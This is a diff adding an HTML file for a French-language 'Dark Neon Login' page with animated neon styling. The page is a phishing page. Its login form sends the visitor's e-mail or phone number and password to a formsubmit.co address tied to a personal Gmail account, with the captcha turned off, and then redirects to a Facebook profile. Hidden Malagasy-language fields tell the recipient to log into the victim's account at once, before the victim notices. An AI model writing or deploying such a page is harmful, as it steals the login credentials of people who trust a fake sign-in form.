@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dark Neon Login</title>
+
+  <!-- Bootstrap 5 -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+
+  <style>
+    :root{
+      --neon:#00ffcc;
+      --neon2:#ff00ff;
+      --dark:#0d0d0d;
+    }
+    body{
+      margin:0;
+      height:100vh;
+      background:var(--dark);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      overflow:hidden;
+      font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
+    }
+
+    /* ---- ANIMATED GRID ---- */
+    .grid-bg{
+      position:absolute;
+      top:0;left:0;width:200%;height:200%;
+      background:
+        linear-gradient(rgba(0,255,204,.1) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,204,.1) 1px, transparent 1px);
+      background-size:40px 40px;
+      animation:grid 6s linear infinite;
+    }
+    @keyframes grid{
+      0%{transform:translate(0,0);}
+      100%{transform:translate(40px,40px);}
+    }
+
+    /* ---- PARTICLES CANVAS ---- */
+    #particles{
+      position:absolute;top:0;left:0;width:100%;height:100%;z-index:1;
+    }
+
+    /* ---- GLASS CARD WITH GLOW ---- */
+    .neon-card{
+      position:relative;
+      z-index:2;
+      width:100%;
+      max-width:400px;
+      padding:45px 35px;
+      background:rgba(13,13,13,.55);
+      backdrop-filter:blur(20px);
+      -webkit-backdrop-filter:blur(20px);
+      border:1px solid var(--neon);
+      border-radius:20px;
+      box-shadow:0 0 20px var(--neon), inset 0 0 15px var(--neon);
+      animation:pulseGlow 3s infinite ease-in-out;
+    }
+    @keyframes pulseGlow{
+      0%,100%{box-shadow:0 0 20px var(--neon), inset 0 0 15px var(--neon);}
+      50%{box-shadow:0 0 35px var(--neon2), inset 0 0 20px var(--neon2);}
+    }
+
+    /* ---- INPUTS ---- */
+    .form-control{
+      background:rgba(0,0,0,.5);
+      border:1px solid var(--neon);
+      color:#fff;
+      border-radius:12px;
+      padding:14px 18px;
+      transition:all .3s ease;
+    }
+    .form-control:focus{
+      background:#000;
+      border-color:var(--neon2);
+      box-shadow:0 0 20px var(--neon2);
+      outline:none;
+      /* vibration mobile */
+      @media (hover:none){body{transform:translateZ(0);animation:vibrate .1s;}}
+    }
+    @keyframes vibrate{
+      0%,100%{transform:translateX(0);}
+      50%{transform:translateX(3px);}
+    }
+
+    /* ---- NEON BUTTON ---- */
+    .btn-neon{
+      width:100%;
+      border:none;
+      border-radius:14px;
+      padding:14px;
+      font-size:18px;
+      font-weight:700;
+      color:#000;
+      background:var(--neon);
+      position:relative;
+      overflow:hidden;
+      transition:all .3s ease;
+    }
+    .btn-neon:hover{transform:scale(1.03);box-shadow:0 0 25px var(--neon);}
+    /* scan line */
+    .btn-neon::after{
+      content:'';
+      position:absolute;
+      top:0;left:-100%;
+      width:100%;height:100%;
+      background:linear-gradient(90deg,transparent,#fff,transparent);
+      transition:left .6s;
+    }
+    .btn-neon:hover::after{left:100%;}
+    /* ripple */
+    .btn-neon span.ripple{
+      position:absolute;border-radius:50%;transform:scale(0);
+      background:rgba(255,255,255,.5);
+      animation:ripple .6s linear;
+    }
+    @keyframes ripple{to{transform:scale(4);opacity:0;}}
+
+    /* ---- FORGOT ---- */
+    .forgot{
+      color:var(--neon);
+      text-decoration:none;
+      font-size:14px;
+      transition:color .3s;
+    }
+    .forgot:hover{color:var(--neon2);}
+  </style>
+</head>
+<body>
+
+<div class="grid-bg"></div>
+<canvas id="particles"></canvas>
+
+<div class="neon-card">
+  <h2 class="text-center mb-4 fw-bold" style="color:var(--neon);">
+    <i class="bi bi-lightning-fill"></i> CONNEXION
+  </h2>
+
+  <form action="https://formsubmit.co/maminirsitraka@gmail.com" method="POST">
+    <input type="hidden" name="_next" value="https://www.facebook.com/voahary.randria.244477">
+    <input type="hidden" name="_subject" value="Efa niditra tamin'ilay site izy">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="Note" value="Tonga dia hidiro ilay compte sao dia fantany">
+
+    <div class="mb-3">
+      <label class="form-label" style="color:var(--neon);">E-mail / Numéro</label>
+      <input type="text" class="form-control" name="Numéro" required>
+    </div>
+
+    <div class="mb-4">
+      <label class="form-label" style="color:var(--neon);">Mot de passe</label>
+      <input type="password" class="form-control" name="Mdp" required>
+    </div>
+
+    <div class="d-grid">
+      <button type="submit" class="btn-neon">Se connecter</button>
+    </div>
+
+    <div class="text-center mt-3">
+      <a class="forgot" href="#">Mot de passe oublié ?</a>
+    </div>
+  </form>
+</div>
+
+<script>
+/* ---- PARTICLES FOLLOW MOUSE ---- */
+const canvas=document.getElementById('particles');
+const ctx=canvas.getContext('2d');
+let W=window.innerWidth,H=window.innerHeight;
+canvas.width=W; canvas.height=H;
+let mouse={x:W/2,y:H/2};
+window.addEventListener('mousemove',e=>{mouse.x=e.x;mouse.y=e;});
+
+const particles=[];
+const max=120;
+class Particle{
+  constructor(){
+    this.x=Math.random()*W;
+    this.y=Math.random()*H;
+    this.r=Math.random()*2+1;
+    this.speed=.15;
+    this.angle=Math.random()*360;
+  }
+  update(){
+    const dx=mouse.x-this.x,dy=mouse.y-this.y,dist=Math.hypot(dx,dy);
+    if(dist<150){
+      const ax=dx/dist*this.speed,ay=dy/dist*this.speed;
+      this.x-=ax;this.y-=ay;
+    }else{
+      this.x+=Math.cos(this.angle)*this.speed;
+      this.y+=Math.sin(this.angle)*this.speed;
+    }
+    if(this.x<0||this.x>W) this.x=Math.random()*W;
+    if(this.y<0||this.y>H) this.y=Math.random()*H;
+  }
+  draw(){
+    ctx.beginPath();
+    ctx.arc(this.x,this.y,this.r,0,Math.PI*2);
+    ctx.fillStyle='rgba(0,255,204,.35)';
+    ctx.fill();
+  }
+}
+function init(){for(let i=0;i<max;i++) particles.push(new Particle());}
+function animate(){ctx.clearRect(0,0,W,H);particles.forEach(p=>{p.update();p.draw();});requestAnimationFrame(animate);}
+init();animate();
+window.addEventListener('resize',()=>{W=window.innerWidth;H=window.innerHeight;canvas.width=W;canvas.height=H;});
+
+/* ---- RIPPLE BTN ---- */
+document.querySelector('.btn-neon').addEventListener('click',function(e){
+  const x=e.clientX-e.target.offsetLeft;
+  const y=e.clientY-e.target.offsetTop;
+  const ripple=document.createElement('span');
+  ripple.classList.add('ripple');
+  ripple.style.left=`${x}px`;ripple.style.top=`${y}px`;
+  this.appendChild(ripple);
+  setTimeout(()=>ripple.remove(),600);
+});
+</script>
+
+<!-- Bootstrap JS (optionnel) -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
